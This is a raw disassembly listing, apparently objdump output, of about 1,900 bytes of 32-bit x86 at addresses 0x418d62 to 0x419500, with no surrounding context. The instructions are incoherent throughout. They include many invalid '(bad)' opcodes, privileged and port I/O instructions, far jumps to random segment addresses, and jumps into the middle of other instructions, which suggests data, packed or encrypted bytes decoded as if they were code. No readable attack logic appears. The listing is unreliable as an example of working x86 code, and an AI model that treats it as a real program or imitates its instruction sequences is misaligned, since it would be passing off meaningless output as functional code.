  418d62:	ret    
  418d63:	jo     0x418d56
  418d65:	cmp    eax,0x3b1f0832
  418d6a:	mov    ebx,0x5ea7bb83
  418d6f:	call   0xe663b708
  418d74:	xchg   edi,eax
  418d75:	jb     0x418d39
  418d77:	mul    bh
  418d79:	pop    esi
  418d7a:	dec    ecx
  418d7b:	mov    ds:0xbe508b99,eax
  418d80:	or     ebx,ebp
  418d82:	bound  ecx,QWORD PTR [ebp-0x2d]
  418d85:	aaa    
  418d86:	neg    BYTE PTR [ebx+0x59ccbb54]
  418d8c:	ret    0x3607
  418d8f:	inc    eax
  418d90:	fistp  DWORD PTR [edi]
  418d92:	lea    esp,[edx]
  418d94:	pushf  
  418d95:	push   ecx
  418d96:	xor    ebx,esi
  418d98:	push   ecx
  418d99:	mov    ah,0xf6
  418d9b:	into   
  418d9c:	stc    
  418d9d:	fdivr  DWORD PTR [edi-0x72a1362]
  418da3:	or     al,0x1
  418da5:	ja     0x418dbe
  418da7:	gs xor eax,0x27bd2f52
  418dad:	adc    eax,0x79563215
  418db2:	not    BYTE PTR [edi+0x33281b1a]
  418db8:	jge    0x418e19
  418dba:	hlt    
  418dbb:	mov    bl,0x39
  418dbd:	inc    ebp
  418dbe:	or     eax,DWORD PTR [ebp-0x55]
  418dc1:	mov    ds,WORD PTR [ebx]
  418dc3:	(bad)  
  418dc4:	leave  
  418dc5:	and    ch,BYTE PTR [edi-0xc]
  418dc8:	add    ah,dh
  418dca:	retf   0x6c28
  418dcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dce:	push   0xb62c97f
  418dd3:	repz and cl,BYTE PTR [edx+0xa]
  418dd7:	pop    ds
  418dd8:	stos   DWORD PTR es:[edi],eax
  418dd9:	mov    WORD PTR [ecx],?
  418ddb:	mov    dl,0xe1
  418ddd:	jne    0x418daa
  418ddf:	inc    ecx
  418de0:	and    ebx,DWORD PTR [ecx-0x693db464]
  418de6:	inc    ebp
  418de7:	inc    edx
  418de8:	out    0x2a,eax
  418dea:	xor    DWORD PTR [ecx+0x56],esp
  418ded:	mov    ebx,0x6a5e4926
  418df2:	fnsave [edi]
  418df4:	out    dx,eax
  418df5:	jbe    0x418df9
  418df7:	sahf   
  418df8:	call   0xe47697d9
  418dfd:	mov    ds:0xcd791560,al
  418e02:	xchg   edx,eax
  418e03:	in     al,dx
  418e04:	repnz mov dl,0x4
  418e07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e08:	les    ebp,FWORD PTR [edx]
  418e0a:	(bad)  
  418e0c:	(bad)  
  418e0d:	icebp  
  418e0e:	shr    BYTE PTR [ebx-0x2419e820],0x6d
  418e15:	retf   
  418e16:	mov    al,0xcf
  418e18:	and    edx,DWORD PTR [eax-0x33]
  418e1b:	daa    
  418e1c:	loop   0x418e76
  418e1e:	xor    bh,ah
  418e20:	outs   dx,BYTE PTR ds:[esi]
  418e21:	ins    BYTE PTR es:[edi],dx
  418e22:	mov    eax,0x3ccbc85a
  418e27:	push   0xf4b78e41
  418e2c:	xor    al,0x66
  418e2e:	dec    ebp
  418e2f:	push   eax
  418e30:	inc    ebp
  418e31:	add    al,0x51
  418e33:	fstp   QWORD PTR [edi]
  418e35:	das    
  418e36:	and    BYTE PTR [edx],dl
  418e38:	pop    ebp
  418e39:	jmp    0x261d:0x9479b4cb
  418e40:	retf   
  418e41:	add    esi,DWORD PTR [esi+0x71ea5a]
  418e47:	ds inc ebx
  418e49:	jecxz  0x418e35
  418e4b:	mov    ebp,0x2a84a4a4
  418e50:	add    BYTE PTR ds:0xaed42fb6,ah
  418e56:	cmc    
  418e57:	sbb    bh,BYTE PTR [eax-0x15]
  418e5a:	mov    DWORD PTR [eax+0x16],ecx
  418e5d:	add    al,0x2c
  418e5f:	(bad)  
  418e60:	rcl    DWORD PTR [eax],1
  418e62:	jge    0x418e03
  418e64:	es mov eax,0xd872c0fa
  418e6a:	mov    esp,0xbd89aeb0
  418e6f:	sub    al,0xcc
  418e71:	popa   
  418e72:	xor    ecx,DWORD PTR [ebx+eax*4]
  418e75:	clc    
  418e76:	push   ebx
  418e77:	pop    edx
  418e78:	test   eax,0x59c79ca7
  418e7d:	in     al,0x17
  418e7f:	mov    ebp,0xd846e68a
  418e84:	imul   esi,DWORD PTR [edi],0x35
  418e87:	fmul   st,st(2)
  418e89:	xor    edx,DWORD PTR ds:0x8a3fbfb0
  418e8f:	retf   
  418e90:	mov    ch,0xd3
  418e92:	jmp    0x8da8:0xec2f7b
  418e99:	popf   
  418e9a:	pop    es
  418e9b:	(bad)  
  418e9c:	hlt    
  418e9d:	xor    edx,DWORD PTR [eax]
  418e9f:	pop    ecx
  418ea0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ea1:	ja     0x418e39
  418ea3:	inc    edi
  418ea4:	cli    
  418ea5:	cli    
  418ea6:	add    al,0xf2
  418ea8:	and    DWORD PTR [ebx],ecx
  418eaa:	inc    edx
  418eab:	xlat   BYTE PTR ds:[ebx]
  418eac:	xchg   ebx,eax
  418ead:	sbb    DWORD PTR fs:[edi+ecx*4-0x3a],0x3515e007
  418eb6:	sub    eax,0x8cc36187
  418ebb:	(bad)  
  418ebd:	in     al,0xae
  418ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ec0:	dec    edi
  418ec1:	adc    BYTE PTR [esi],dh
  418ec3:	idiv   BYTE PTR [ebp+0x33f6f444]
  418ec9:	lods   al,BYTE PTR ds:[esi]
  418eca:	lahf   
  418ecb:	and    DWORD PTR [edi+0x4f],ebp
  418ece:	pop    edi
  418ecf:	fwait
  418ed0:	(bad)  
  418ed1:	mov    ah,0xfc
  418ed3:	aas    
  418ed4:	scas   eax,DWORD PTR es:[edi]
  418ed5:	mov    dl,0xa6
  418ed7:	shr    BYTE PTR [ebp-0x61b157cd],0x9e
  418ede:	int3   
  418edf:	out    dx,eax
  418ee0:	mov    al,ds:0x53f0338f
  418ee5:	popa   
  418ee6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ee7:	int3   
  418ee8:	inc    edi
  418ee9:	int    0xa6
  418eeb:	and    DWORD PTR [edx],esp
  418eed:	adc    BYTE PTR [esi+0x3cfc89ce],bh
  418ef3:	mov    al,ds:0xaa0287bd
  418ef8:	push   esp
  418ef9:	sub    DWORD PTR [edx],edi
  418efb:	in     al,dx
  418efc:	stos   BYTE PTR es:[edi],al
  418efd:	loope  0x418eb0
  418eff:	test   eax,0x2130d90d
  418f04:	jmp    0xd7b3076f
  418f09:	jecxz  0x418f59
  418f0b:	enter  0xf0ed,0x4
  418f0f:	fistp  WORD PTR [di-0x3da2]
  418f14:	test   al,0x1d
  418f16:	out    0x74,al
  418f18:	dec    esi
  418f19:	aad    0xb
  418f1b:	mov    edi,0xe12f44d5
  418f20:	push   eax
  418f21:	lahf   
  418f22:	aam    0xd2
  418f24:	pushf  
  418f25:	daa    
  418f26:	pop    esp
  418f27:	adc    al,0x78
  418f29:	(bad)  
  418f2a:	std    
  418f2b:	dec    ebp
  418f2c:	xchg   ebx,eax
  418f2d:	inc    ecx
  418f2e:	les    ebx,FWORD PTR [ebx]
  418f30:	fdivr  QWORD PTR [ebp+0x30]
  418f33:	imul   esp,DWORD PTR [edx-0x53],0x78
  418f37:	dec    BYTE PTR [esi+0x62]
  418f3a:	mov    al,ds:0xb185837c
  418f3f:	gs int3 
  418f41:	push   eax
  418f42:	(bad)  
  418f43:	cs scas eax,DWORD PTR es:[edi]
  418f45:	scas   al,BYTE PTR es:[edi]
  418f46:	jne    0x418f11
  418f48:	jmp    0x418eed
  418f4a:	mov    eax,0x56e6eae0
  418f4f:	test   al,0x83
  418f51:	not    eax
  418f53:	test   eax,0x6fd4122c
  418f58:	push   eax
  418f59:	shl    edx,1
  418f5b:	js     0x418f8c
  418f5d:	dec    edi
  418f5e:	mov    al,0xe3
  418f60:	xchg   bh,ah
  418f62:	aam    0xed
  418f64:	cmp    ecx,DWORD PTR [esi]
  418f66:	addps  xmm5,XMMWORD PTR [edx-0x79]
  418f6a:	xchg   ebx,eax
  418f6b:	xor    BYTE PTR [edx-0xb],bl
  418f6e:	mov    ebp,0xd3848f0f
  418f73:	stc    
  418f74:	add    cl,ah
  418f76:	jnp    0x418f82
  418f78:	mov    esp,0x69e86358
  418f7d:	nop
  418f7e:	rcr    BYTE PTR [esi+0x478b6605],0x53
  418f85:	push   0x5339afcc
  418f8a:	ret    0x12bf
  418f8d:	or     dl,cl
  418f8f:	push   ebp
  418f90:	(bad)  [ebx+ebp*4-0x2f]
  418f94:	outs   dx,BYTE PTR ds:[esi]
  418f95:	pusha  
  418f96:	mov    dh,BYTE PTR [edx*8+0x32b14a48]
  418f9d:	enter  0x5e2f,0xcf
  418fa1:	out    0xd7,eax
  418fa3:	inc    edx
  418fa4:	mov    al,ds:0x40ea0d8a
  418fa9:	and    DWORD PTR [ecx+0x48],edx
  418fac:	jl     0x41901f
  418fae:	aaa    
  418faf:	test   DWORD PTR [esi],edi
  418fb1:	loop   0x418f93
  418fb3:	aad    0x10
  418fb5:	les    esi,FWORD PTR [edi]
  418fb7:	ds xor bh,0xaf
  418fbb:	scas   eax,DWORD PTR es:[edi]
  418fbc:	lods   eax,DWORD PTR ds:[esi]
  418fbd:	mov    eax,ds:0x3464ce3b
  418fc2:	fimul  WORD PTR [esp+edx*1+0x198c8c56]
  418fc9:	ret    
  418fca:	pop    ss
  418fcb:	loop   0x418ffe
  418fcd:	inc    ecx
  418fce:	pushf  
  418fcf:	pop    edi
  418fd0:	js     0x418f72
  418fd2:	fwait
  418fd3:	loopne 0x418fcb
  418fd5:	mov    ah,0x88
  418fd7:	add    DWORD PTR [ebx-0x4f],eax
  418fda:	mov    ebx,0x336df94f
  418fdf:	push   edi
  418fe0:	in     eax,dx
  418fe1:	out    0xd0,al
  418fe3:	fdivr  QWORD PTR [esi]
  418fe5:	xor    esp,DWORD PTR [esi+edi*4]
  418fe8:	bound  edx,QWORD PTR [ebx-0x61f3178a]
  418fee:	cmp    dl,dl
  418ff0:	push   es
  418ff1:	cmp    BYTE PTR [eax+0x10a00d0e],al
  418ff7:	(bad)  
  418ff8:	fdiv   st(5),st
  418ffa:	push   esi
  418ffb:	pushf  
  418ffc:	pop    ss
  418ffd:	dec    edx
  418ffe:	xchg   DWORD PTR [edx],ecx
  419000:	test   eax,0x3f27f9d0
  419005:	fcomp  QWORD PTR [ebx-0x62472e4b]
  41900b:	dec    DWORD PTR [esp+edi*8+0x4276dd0d]
  419012:	js     0x418fad
  419014:	pop    ebp
  419015:	adc    DWORD PTR [ebp+0x5b394bb9],0xb9cd6c0e
  41901f:	pop    ss
  419020:	push   cs
  419021:	pop    eax
  419022:	mov    ebx,0x6f072e46
  419027:	mov    al,ds:0xfd953234
  41902c:	addr16 pop ebp
  41902e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41902f:	(bad)  
  419030:	xchg   ebx,eax
  419031:	lea    ecx,[ebx]
  419033:	or     eax,0x91863430
  419038:	aad    0xa2
  41903a:	xchg   ecx,eax
  41903b:	adc    al,0x7c
  41903d:	lahf   
  41903e:	js     0x419080
  419040:	aas    
  419041:	or     DWORD PTR [esi],eax
  419043:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419044:	aaa    
  419045:	pop    esi
  419046:	mov    ch,0x41
  419048:	lea    eax,[esi+ebp*2-0x17]
  41904c:	lods   al,BYTE PTR ds:[esi]
  41904d:	test   eax,0xfabf5914
  419052:	daa    
  419053:	out    0x94,eax
  419055:	or     BYTE PTR [edi+0x48],bh
  419058:	mul    DWORD PTR [ebx-0x30]
  41905b:	loopne 0x418ff3
  41905d:	outs   dx,DWORD PTR ds:[esi]
  41905e:	mov    al,ds:0x517f9151
  419063:	mov    bl,0xfe
  419065:	out    dx,al
  419066:	jecxz  0x4190b1
  419068:	outs   dx,DWORD PTR ds:[esi]
  419069:	push   0x8b64f119
  41906e:	push   0xfffffffe
  419070:	(bad)  
  419071:	jbe    0x41908c
  419073:	mov    edx,0xff210f6b
  419078:	push   eax
  419079:	sub    al,0x79
  41907b:	cli    
  41907c:	pop    esp
  41907d:	cmp    DWORD PTR [ebx],esp
  41907f:	inc    ebp
  419080:	test   BYTE PTR [ebx-0x299b33d7],bh
  419086:	enter  0x4c62,0xa3
  41908a:	mov    ebp,0x454fc07b
  41908f:	cwde   
  419090:	add    al,0x91
  419092:	in     eax,0xa9
  419094:	dec    esp
  419095:	jo     0x41906d
  419097:	in     eax,dx
  419098:	outs   dx,DWORD PTR ds:[esi]
  419099:	data16 sbb BYTE PTR [edi+0x70],ch
  41909d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41909e:	xor    esi,DWORD PTR [esi]
  4190a0:	mov    bh,0xf3
  4190a2:	mov    eax,0x83217bdb
  4190a7:	xchg   edi,eax
  4190a8:	or     al,0xb2
  4190aa:	mov    es,WORD PTR [eax-0x4929ab4f]
  4190b0:	(bad)  
  4190b1:	xor    BYTE PTR [ebx+0xa38edb5],ah
  4190b7:	jne    0x419040
  4190b9:	(bad)  
  4190ba:	mov    dl,0xe8
  4190bc:	jnp    0x4190f1
  4190be:	bound  ecx,QWORD PTR [edi-0x691a17bc]
  4190c4:	adc    bl,0xf5
  4190c7:	hlt    
  4190c8:	dec    ecx
  4190c9:	and    ebx,DWORD PTR ds:0xd082a7da
  4190cf:	pop    eax
  4190d0:	pop    edx
  4190d1:	inc    ebp
  4190d2:	ins    BYTE PTR es:[edi],dx
  4190d3:	fs mov bh,0x2c
  4190d6:	fldenv [edx]
  4190d8:	fisttp WORD PTR [eax+0x5d]
  4190db:	mov    eax,ds:0x3db4258f
  4190e0:	xchg   edx,eax
  4190e1:	lds    esp,FWORD PTR [eax-0x45773b7b]
  4190e7:	push   cs
  4190e8:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4190ea:	aad    0xa6
  4190ec:	ror    esi,1
  4190ee:	add    DWORD PTR [ecx-0x292ebbdd],esp
  4190f4:	mov    al,0x99
  4190f6:	call   0x774e:0x357878cd
  4190fd:	push   esp
  4190fe:	repz cmp BYTE PTR [esi],bl
  419101:	out    0x82,al
  419103:	test   dl,cl
  419105:	cwde   
  419106:	jns    0x419119
  419108:	sar    BYTE PTR [ebp-0x1d],0xee
  41910c:	sbb    al,0x4b
  41910e:	popa   
  41910f:	lods   al,BYTE PTR ds:[esi]
  419110:	outs   dx,DWORD PTR ds:[esi]
  419111:	xchg   edi,eax
  419112:	imul   ebx,DWORD PTR [edx],0xffffffc5
  419115:	outs   dx,BYTE PTR gs:[esi]
  419117:	inc    edx
  419118:	pop    es
  419119:	in     al,dx
  41911a:	gs mov ch,dl
  41911d:	dec    eax
  41911e:	jbe    0x419119
  419120:	loopne 0x419146
  419122:	stos   DWORD PTR es:[edi],eax
  419123:	and    BYTE PTR [ebx],ch
  419125:	int3   
  419126:	sbb    BYTE PTR [esi],dh
  419128:	mov    ch,0xa2
  41912a:	xchg   esp,eax
  41912b:	xor    BYTE PTR cs:[eax+0x19cae9ea],dh
  419132:	push   esi
  419133:	fdivr  QWORD PTR [eax-0x44]
  419136:	sbb    edx,DWORD PTR [ebx+0x25]
  419139:	xor    BYTE PTR [ecx],0x65
  41913c:	mov    edi,DWORD PTR [edi]
  41913e:	fimul  WORD PTR [ebx]
  419140:	push   ebp
  419141:	std    
  419142:	adc    edi,edx
  419144:	aaa    
  419145:	or     eax,0x7aedfea4
  41914a:	ins    DWORD PTR es:[edi],dx
  41914b:	outs   dx,BYTE PTR ds:[esi]
  41914c:	nop
  41914d:	xlat   BYTE PTR ds:[ebx]
  41914e:	sbb    eax,0xbdc15afd
  419153:	bnd jns 0x419166
  419156:	cwde   
  419157:	lods   eax,DWORD PTR ds:[esi]
  419158:	js     0x41919e
  41915a:	cmp    ah,0x3e
  41915d:	push   0xb9c0781e
  419162:	or     ch,dh
  419164:	jo     0x4191b2
  419166:	ror    DWORD PTR [edi+0x7e],cl
  419169:	lahf   
  41916a:	and    esi,DWORD PTR [ebx-0x7c6abf74]
  419170:	fs or  al,0x25
  419173:	and    al,0xf6
  419176:	je     0x419100
  419178:	dec    ebx
  419179:	cmp    BYTE PTR [esi+0x4c1d2709],0xbd
  419180:	cmp    al,0xba
  419182:	sbb    eax,0xdbf66c45
  419187:	mov    bh,cl
  419189:	inc    edi
  41918a:	pushf  
  41918b:	xlat   BYTE PTR ds:[ebx]
  41918c:	stc    
  41918d:	fs push esi
  41918f:	sbb    DWORD PTR [eax+0x79],edi
  419192:	add    BYTE PTR ds:0xf4384abf,al
  419198:	sub    DWORD PTR [ebp+0x3159d987],0xc8662da2
  4191a2:	in     eax,0xda
  4191a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191a5:	sub    esp,DWORD PTR [edx-0x38ea77dc]
  4191ab:	ja     0x419173
  4191ad:	xchg   edi,eax
  4191ae:	iret   
  4191af:	jno    0x41920d
  4191b1:	push   edi
  4191b2:	sub    ch,BYTE PTR [esi+0x23]
  4191b5:	dec    ebx
  4191b6:	add    BYTE PTR [eax+0x3b459670],al
  4191bc:	mov    bl,0x52
  4191be:	mov    DWORD PTR [edi+0x70],ebp
  4191c1:	pop    ecx
  4191c2:	scas   al,BYTE PTR es:[edi]
  4191c3:	cmp    eax,0xdf3abf8e
  4191c8:	enter  0x66a4,0xc2
  4191cc:	test   DWORD PTR [edi],ebx
  4191ce:	pop    ss
  4191cf:	shl    BYTE PTR [ebx-0x4d546743],0x49
  4191d6:	dec    ebx
  4191d7:	addr16 mov dh,0x39
  4191da:	ror    DWORD PTR [edi+eax*4],0x19
  4191de:	(bad)  
  4191df:	jb     0x41921e
  4191e1:	loope  0x4191cd
  4191e3:	test   DWORD PTR ds:0x989fa594,ebx
  4191e9:	in     al,dx
  4191ea:	(bad)  {k4}
  4191ef:	rol    BYTE PTR [ebx-0x2e40a6e4],1
  4191f5:	add    ch,BYTE PTR [esi+0x45]
  4191f8:	inc    edx
  4191f9:	cmp    eax,0xcd57482a
  4191fe:	into   
  4191ff:	out    dx,al
  419200:	jmp    FWORD PTR [ebx+esi*4-0x3eb9d205]
  419207:	(bad)  
  419208:	retf   0x536c
  41920b:	dec    edi
  41920c:	pushf  
  41920d:	mov    eax,ds:0x6c24e405
  419212:	shl    BYTE PTR [eax-0x40d63985],0xec
  419219:	nop
  41921a:	or     dl,dh
  41921c:	out    dx,al
  41921d:	push   ebx
  41921e:	mov    bl,al
  419220:	and    esi,ebp
  419222:	adc    al,0x7d
  419224:	daa    
  419225:	mov    bl,0xa9
  419227:	push   cs
  419228:	cmc    
  419229:	adc    eax,0x7401658f
  41922e:	or     al,0xdd
  419230:	outs   dx,DWORD PTR ds:[esi]
  419231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419232:	pop    ebp
  419233:	mov    DWORD PTR [esi-0x144924ff],esp
  419239:	mov    gs,WORD PTR [ebx-0x44]
  41923c:	call   0x16e8:0x6355c400
  419243:	cmp    al,0x70
  419245:	mov    eax,0x4607f687
  41924a:	push   0x6cce10f7
  41924f:	push   0x56
  419251:	adc    dh,ah
  419253:	pop    es
  419254:	pop    edx
  419255:	outs   dx,BYTE PTR ds:[esi]
  419256:	sub    al,0xdb
  419258:	gs ins BYTE PTR es:[edi],dx
  41925a:	push   eax
  41925b:	fcompp 
  41925d:	scas   eax,DWORD PTR es:[edi]
  41925e:	pusha  
  41925f:	inc    edx
  419260:	mov    DWORD PTR [ecx+ebp*2],edx
  419263:	adc    cl,BYTE PTR [ebx-0x65]
  419266:	mov    esp,0xfea7874e
  41926b:	fcom   QWORD PTR [ecx]
  41926d:	sar    DWORD PTR [ebp+0x30d2a4aa],0xc9
  419274:	xchg   esi,eax
  419275:	mov    eax,ds:0x416e7dce
  41927a:	pop    ebx
  41927b:	sbb    ch,0xe5
  41927e:	fisub  WORD PTR [ebx+0x75f47171]
  419284:	pop    ecx
  419285:	dec    ebp
  419286:	fcomp  DWORD PTR [eax+edi*1-0x32]
  41928a:	push   esi
  41928b:	clc    
  41928c:	dec    DWORD PTR [ebp+0x40b80fef]
  419292:	icebp  
  419293:	sbb    bh,BYTE PTR [ebx+ebx*4]
  419296:	pop    ebx
  419297:	sbb    al,0xe
  419299:	xchg   DWORD PTR [ecx-0x3c8a0648],edi
  41929f:	dec    edx
  4192a0:	inc    eax
  4192a1:	dec    ebx
  4192a2:	inc    esi
  4192a3:	cmp    BYTE PTR [ebx+ebp*8+0x28d2d5a5],dh
  4192aa:	cwde   
  4192ab:	jmp    0x41930f
  4192ad:	cmp    esi,edi
  4192af:	mov    dl,0x79
  4192b1:	sbb    ah,0x57
  4192b4:	push   esp
  4192b5:	pop    esp
  4192b6:	sbb    bh,BYTE PTR [ebx+0x793ab78]
  4192bc:	or     eax,0xc7febd5d
  4192c1:	(bad)  
  4192c2:	xchg   edi,eax
  4192c3:	pushf  
  4192c4:	xlat   BYTE PTR ds:[ebx]
  4192c5:	imul   ebp,DWORD PTR [ebx],0xc4572915
  4192cb:	add    esp,DWORD PTR [edi]
  4192cd:	(bad)  
  4192ce:	xlat   BYTE PTR ds:[ebx]
  4192cf:	add    dh,0x65
  4192d2:	out    dx,eax
  4192d3:	xor    al,0x56
  4192d5:	or     dh,BYTE PTR [edi+0x7b]
  4192d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192d9:	test   al,0xd8
  4192db:	cmp    al,0xe
  4192dd:	fdivr  DWORD PTR [esi-0x6cae40b]
  4192e3:	jne    0x419276
  4192e5:	sub    ah,BYTE PTR [ecx+0x22]
  4192e8:	mov    ah,0x97
  4192ea:	add    eax,0xc2ac31fe
  4192ef:	dec    edx
  4192f0:	mov    ah,BYTE PTR [eax-0x40aad157]
  4192f6:	shl    BYTE PTR [ecx-0xf48551a],cl
  4192fc:	fisttp QWORD PTR [ebp+0x3b]
  4192ff:	mov    al,ds:0xca77d22e
  419304:	dec    edi
  419305:	or     BYTE PTR [edx],0x74
  419308:	pop    es
  419309:	xor    ebp,DWORD PTR [eax+ecx*4-0x53]
  41930d:	aaa    
  41930e:	inc    esp
  41930f:	cmp    BYTE PTR [esi+0xa],0x61
  419313:	imul   edx,DWORD PTR [edi-0x2f],0x3f
  419317:	cs and al,0xae
  41931a:	jb     0x419301
  41931c:	xor    eax,0xc56eacc4
  419321:	aad    0x62
  419323:	xchg   edx,eax
  419324:	xchg   ecx,eax
  419325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419326:	div    BYTE PTR [ecx+edx*1+0x4043806f]
  41932d:	xchg   esp,eax
  41932e:	push   edi
  41932f:	aam    0xaa
  419331:	xchg   esi,eax
  419332:	xor    eax,0xb3261bfa
  419337:	test   DWORD PTR [ebx-0x75],edx
  41933a:	popa   
  41933b:	in     al,dx
  41933c:	sub    eax,DWORD PTR [ecx-0x1fd1598]
  419342:	scas   al,BYTE PTR es:[edi]
  419343:	dec    edi
  419344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419345:	mov    ds:0x4e778f06,al
  41934a:	repnz scas al,BYTE PTR es:[edi]
  41934c:	jmp    0x4192da
  41934e:	push   esp
  41934f:	dec    edx
  419350:	mov    esp,0x8cd4eb98
  419355:	repnz or eax,0x6808bc9e
  41935b:	fisub  DWORD PTR [ecx]
  41935d:	cmp    DWORD PTR [edx],esi
  41935f:	cli    
  419360:	pop    eax
  419361:	shl    al,1
  419363:	jbe    0x419333
  419365:	jne    0x4193d0
  419367:	inc    ebx
  419368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419369:	test   al,0xbf
  41936b:	sub    esp,DWORD PTR [ebx-0x5fdee6cf]
  419371:	mul    BYTE PTR [eax+0x7b]
  419374:	cmp    BYTE PTR [esi+0x7f],bh
  419377:	and    al,0xb0
  419379:	pusha  
  41937a:	cmp    edi,DWORD PTR [esi-0x5]
  41937d:	daa    
  41937e:	adc    dl,BYTE PTR [ebp-0x1bdff6cf]
  419384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419385:	gs out dx,eax
  419387:	rcl    BYTE PTR [eax],0x91
  41938a:	das    
  41938b:	scas   al,BYTE PTR es:[edi]
  41938c:	or     al,0x4b
  41938e:	call   0x723cad67
  419393:	sbb    esi,DWORD PTR ds:0xff7c5828
  419399:	jo     0x4193dc
  41939b:	cmp    BYTE PTR [esi+edi*1],al
  41939e:	arpl   sp,sp
  4193a0:	shl    bl,0x25
  4193a3:	lods   al,BYTE PTR gs:[esi]
  4193a5:	jle    0x41933b
  4193a7:	push   cs
  4193a8:	mov    dl,0x20
  4193aa:	jo     0x41940a
  4193ac:	ins    DWORD PTR es:[edi],dx
  4193ad:	js     0x419414
  4193af:	enter  0x7aa4,0xe8
  4193b3:	iret   
  4193b4:	inc    ebp
  4193b5:	int3   
  4193b6:	mov    dh,0x6a
  4193b8:	push   cs
  4193b9:	inc    edx
  4193ba:	mov    ebx,0x4bb57e48
  4193bf:	mov    ds:0x92935d4d,eax
  4193c4:	jbe    0x4193fe
  4193c6:	cmp    dl,bl
  4193c8:	scas   al,BYTE PTR es:[edi]
  4193c9:	mov    bl,0xc6
  4193cb:	jge    0x41935e
  4193cd:	nop
  4193ce:	ret    
  4193cf:	jns    0x419363
  4193d1:	xor    BYTE PTR [ecx-0x4b2d288c],ch
  4193d7:	sub    al,0xee
  4193d9:	or     BYTE PTR [ecx+ecx*2],bl
  4193dc:	(bad)  
  4193dd:	adc    eax,0x5978bd1e
  4193e2:	hlt    
  4193e3:	and    DWORD PTR [edx],ebx
  4193e5:	mov    esp,0x108e9a28
  4193ea:	jnp    0x4193fe
  4193ec:	and    ebx,ebp
  4193ee:	jae    0x4193a6
  4193f0:	ins    BYTE PTR es:[edi],dx
  4193f1:	(bad)  
  4193f2:	int    0x39
  4193f4:	sub    DWORD PTR [esi+edx*2+0x49],0x9efb4bca
  4193fc:	das    
  4193fd:	sub    al,0x8d
  4193ff:	(bad)  
  419400:	aaa    
  419401:	sbb    al,0x94
  419403:	xor    esp,DWORD PTR [ecx-0x1f]
  419406:	arpl   bx,cx
  419408:	sub    DWORD PTR ds:0xa572a457,0x71090c8d
  419412:	scas   eax,DWORD PTR es:[edi]
  419413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419414:	push   cs
  419415:	and    eax,0x9bfb6dfb
  41941a:	cmp    dl,BYTE PTR [edi+0x2a540d20]
  419420:	and    DWORD PTR [ebp-0x16d6ac94],edi
  419426:	xchg   esp,eax
  419427:	xchg   BYTE PTR [ecx],cl
  419429:	xor    eax,0x22dce475
  41942e:	(bad)  
  419430:	adc    bl,BYTE PTR [eax]
  419432:	aaa    
  419433:	sbb    al,bl
  419435:	add    bl,BYTE PTR [edx]
  419437:	pop    edx
  419438:	pop    edx
  419439:	cdq    
  41943a:	out    dx,al
  41943b:	je     0x41948f
  41943d:	data16 cld 
  41943f:	js     0x419402
  419441:	sbb    BYTE PTR [edx],0x59
  419444:	sbb    BYTE PTR [edx-0x65],bl
  419447:	xchg   ecx,eax
  419448:	call   0xd016:0x1756b09a
  41944f:	repnz xor eax,0x35349529
  419455:	ds out dx,eax
  419457:	(bad)  
  419458:	mov    ebx,ebp
  41945a:	in     eax,dx
  41945b:	xchg   esp,eax
  41945c:	lock jmp 0xa0bc:0x9f927af0
  419464:	cwde   
  419465:	clc    
  419466:	into   
  419467:	fcom   DWORD PTR [ecx]
  419469:	les    esi,FWORD PTR [bx+di]
  41946c:	cli    
  41946d:	or     esp,edx
  41946f:	and    BYTE PTR [edi-0x5a],0x28
  419473:	mov    bl,0x93
  419475:	xacquire xchg BYTE PTR [edx],dl
  419478:	aaa    
  419479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41947a:	adc    al,0xf7
  41947c:	mov    edx,0x656531d6
  419481:	fwait
  419482:	adc    DWORD PTR [eax+0x25e9d47f],ebp
  419488:	mov    gs,WORD PTR [ebp+0x7a81db24]
  41948e:	loopne 0x41944b
  419490:	pop    ds
  419491:	and    edx,DWORD PTR [eax-0x34]
  419494:	mov    ebp,DWORD PTR [ecx-0x352a3932]
  41949a:	xor    ah,bl
  41949c:	mov    eax,0x82ca7559
  4194a1:	push   ebp
  4194a2:	dec    edx
  4194a3:	push   ebp
  4194a4:	rcr    bl,1
  4194a6:	xchg   esp,eax
  4194a7:	sbb    al,0x5f
  4194a9:	mov    ds:0x943fc353,al
  4194ae:	and    BYTE PTR [ecx],al
  4194b0:	sub    DWORD PTR [esi-0x4d],0xfffffffa
  4194b4:	and    eax,0x87d5c633
  4194b9:	popw   ds
  4194bb:	mov    ebp,0x9f137bd6
  4194c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194c1:	add    eax,0x5cfae377
  4194c6:	les    edi,FWORD PTR [ecx]
  4194c8:	cs push eax
  4194ca:	lahf   
  4194cb:	or     ecx,DWORD PTR [ecx-0x7d56b0c2]
  4194d1:	or     al,0xc3
  4194d3:	aas    
  4194d4:	out    0xde,eax
  4194d6:	pop    esp
  4194d7:	test   WORD PTR [ecx+0x56],di
  4194db:	xchg   ebp,eax
  4194dc:	xor    ch,BYTE PTR [ebx+edi*4]
  4194df:	mulps  xmm0,xmm0
  4194e2:	cdq    
  4194e3:	test   DWORD PTR [ebp+edx*1-0x71],0x34acdb40
  4194eb:	sbb    bl,BYTE PTR [edx+0x5b790eb9]
  4194f1:	hlt    
  4194f2:	adc    ecx,DWORD PTR [ebp+0x13]
  4194f5:	hlt    
  4194f6:	jne    0x4194e6
  4194f8:	dec    ecx
  4194f9:	cmp    ch,BYTE PTR ds:0xc6d2d6d
  419500:	and    BYTE PTR [edi+0x52],cl
